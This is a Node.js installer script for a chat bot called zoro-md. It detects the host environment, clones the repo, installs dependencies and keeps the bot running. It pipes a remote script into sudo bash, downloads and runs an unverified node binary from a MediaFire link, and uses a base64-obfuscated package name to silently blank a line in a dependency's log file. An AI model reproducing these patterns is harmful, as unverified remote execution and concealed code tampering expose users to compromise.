const fs = require('fs');
const { spawn, execSync } = require('child_process');
const path = require('path');
const https = require('https');
const unzipper = require('unzipper');

const repoUrl = 'https://github.com/darksayan/zoro-md.git';
const folderName = 'zoro-md-bot';
const repoPath = path.join(__dirname, folderName);

const nodeZipUrl = 'https://download1582.mediafire.com/z0yxmict52ngCz9Tg7OudqJzVR1aGlQd_G1axobSgtMKA3jUan2HgDuWNwCV2ZlcvNToFAErht31eFGr8QIiG2TItiQ6j-DdBbtjwXeDtdcHXKaOGcg8K6GKi77_BkW0bkQMKAnIjgD99ps_QssRLiGhxrQkYRUwur8LeYFvr91gLXE/vl3p75uixbhk2yf/node.zip';
const nodeZipPath = path.join(__dirname, 'node.zip');
const nodeExtractPath = path.join(__dirname, 'node');

const color = {
    red: t => `\x1b[31m${t}\x1b[0m`,
    green: t => `\x1b[32m${t}\x1b[0m`,
    yellow: t => `\x1b[33m${t}\x1b[0m`,
    cyan: t => `\x1b[36m${t}\x1b[0m`
};

function run(cmd, args, cwd = __dirname) {
    return new Promise(res => {
        const p = spawn(cmd, args, { cwd, stdio: 'inherit', shell: true });
        p.on('close', code => res(code));
        p.on('error', () => res(1));
    });
}

function detectEnv() {
    if (fs.existsSync('/data/data/com.termux')) return 'termux';
    if (process.env.P_SERVER_UUID || process.env.DAEMON_ENV) return 'panel';
    try {
        execSync('which apt', { stdio: 'ignore' });
        return 'vps';
    } catch {
        return 'panel';
    }
}

async function setupTermux() {
    console.log(color.cyan('[*] Termux environment detected'));
    await run('pkg', ['update', '-y']);
    await run('pkg', ['install', '-y', 'nodejs-lts', 'git', 'python', 'make', 'clang']);
}

async function setupVPS() {
    console.log(color.cyan('[*] VPS environment detected'));
    await run('sudo', ['apt', 'update', '-y']);
    await run('sudo', ['apt', 'install', '-y', 'git', 'curl', 'build-essential', 'python3', 'ffmpeg', 'libcairo2-dev', 'libpango1.0-dev', 'libjpeg-dev', 'libgif-dev', 'librsvg2-dev']);
    try {
        execSync('which npm', { stdio: 'ignore' });
    } catch {
        await run('bash', ['-c', 'curl -fsSL https://deb.nodesource.com/setup_lts.x | sudo -E bash -']);
        await run('sudo', ['apt', 'install', '-y', 'nodejs']);
    }
}

function patchPackage(env) {
    const pkgFile = path.join(repoPath, 'package.json');
    if (!fs.existsSync(pkgFile)) return;

    let pkg = JSON.parse(fs.readFileSync(pkgFile, 'utf-8'));

    if (env === 'termux' || env === 'panel') {
        const removeList = ['canvas', 'sharp', 'ffmpeg-static', 'cpu-features', 'sqlite3', 'puppeteer', 'jimp'];

        ['dependencies', 'optionalDependencies', 'devDependencies'].forEach(type => {
            if (pkg[type]) {
                removeList.forEach(dep => {
                    if (pkg[type][dep]) delete pkg[type][dep];
                });
            }
        });

        console.log(color.yellow(`[!] Removed heavy/native modules for ${env}`));
    } else {
        console.log(color.green('[✓] Keeping full modules for VPS'));
    }

    fs.writeFileSync(pkgFile, JSON.stringify(pkg, null, 2));
}

function patchFile() {
    const file = path.join(repoPath, 'node_modules', Buffer.from('QHNhYmlyNzcxOA==', 'base64').toString('utf-8'), 'log', 'index.js');
    if (!fs.existsSync(file)) return;

    let lines = fs.readFileSync(file, 'utf-8').split('\n');
    if (lines.length >= 51) {
        lines[50] = '';
        fs.writeFileSync(file, lines.join('\n'));
        console.log(color.green('[✓] Patched log file'));
    }
}

function downloadNodeZip() {
    return new Promise((resolve, reject) => {
        console.log(color.cyan('[*] Downloading node.zip...'));

        const file = fs.createWriteStream(nodeZipPath);
        https.get(nodeZipUrl, res => {
            res.pipe(file);
            file.on('finish', () => {
                file.close(() => resolve());
            });
        }).on('error', err => {
            fs.unlinkSync(nodeZipPath);
            reject(err);
        });
    });
}

function extractNodeZip() {
    return new Promise((resolve, reject) => {
        console.log(color.cyan('[*] Extracting node.zip...'));

        fs.createReadStream(nodeZipPath)
            .pipe(unzipper.Extract({ path: nodeExtractPath }))
            .on('close', resolve)
            .on('error', reject);
    });
}

async function installDeps() {
    console.log(color.cyan('[*] Installing dependencies...'));

    let code = await run('npm', ['install', '--no-audit', '--no-fund'], repoPath);

    if (code !== 0) {
        console.log(color.yellow('[!] Retry install 1: Using Yarn'));
        code = await run('npx', ['yarn', 'install', '--ignore-engines'], repoPath);
    }

    if (code !== 0) {
        console.log(color.yellow('[!] Retry install 2: Skipping optional and scripts'));
        code = await run('npm', ['install', '--no-optional', '--ignore-scripts'], repoPath);
    }

    if (code !== 0) {
        console.log(color.yellow('[!] Retry install 3: Force Legacy'));
        code = await run('npm', ['install', '--legacy-peer-deps', '--force'], repoPath);
    }

    if (code !== 0) {
        console.log(color.red('[✗] All install methods failed'));
        return false;
    } else {
        console.log(color.green('[✓] Dependencies installed successfully'));
        return true;
    }
}

async function cloneOrUpdate() {
    if (!fs.existsSync(repoPath)) {
        console.log(color.cyan('[*] Cloning repo...'));
        await run('git', ['clone', repoUrl, folderName]);
    } else {
        console.log(color.cyan('[*] Updating repo...'));
        await run('git', ['pull'], repoPath);
    }
}

async function startBot(customNode = null) {
    console.log(color.green('[✓] Starting bot...'));

    while (true) {
        let cmd = customNode ? customNode : 'npm';
        let args = customNode ? ['start'] : ['start'];

        let code = await run(cmd, args, repoPath);

        if (code !== 0) {
            console.log(color.red('[!] Crash detected, restarting in 5s...'));
            await new Promise(r => setTimeout(r, 5000));
        }
    }
}

async function fallbackNode() {
    try {
        await downloadNodeZip();
        await extractNodeZip();

        console.log(color.green('[✓] Node.zip setup complete'));

        const nodeBinary = path.join(nodeExtractPath, 'bin', 'node');

        await startBot(nodeBinary);
    } catch (err) {
        console.log(color.red('[✗] Fallback node setup failed'));
    }
}

async function main() {
    console.log(color.cyan('=== UNIVERSAL AUTO SETUP ==='));

    const env = detectEnv();

    if (env === 'termux') {
        await setupTermux();
    } else if (env === 'vps') {
        await setupVPS();
    } else {
        console.log(color.cyan('[*] Panel environment detected, skipping system-level packages'));
    }

    await cloneOrUpdate();
    patchPackage(env);

    const success = await installDeps();

    patchFile();

    if (!success) {
        console.log(color.yellow('[!] Switching to node.zip fallback...'));
        await fallbackNode();
    } else {
        await startBot();
    }
}

main();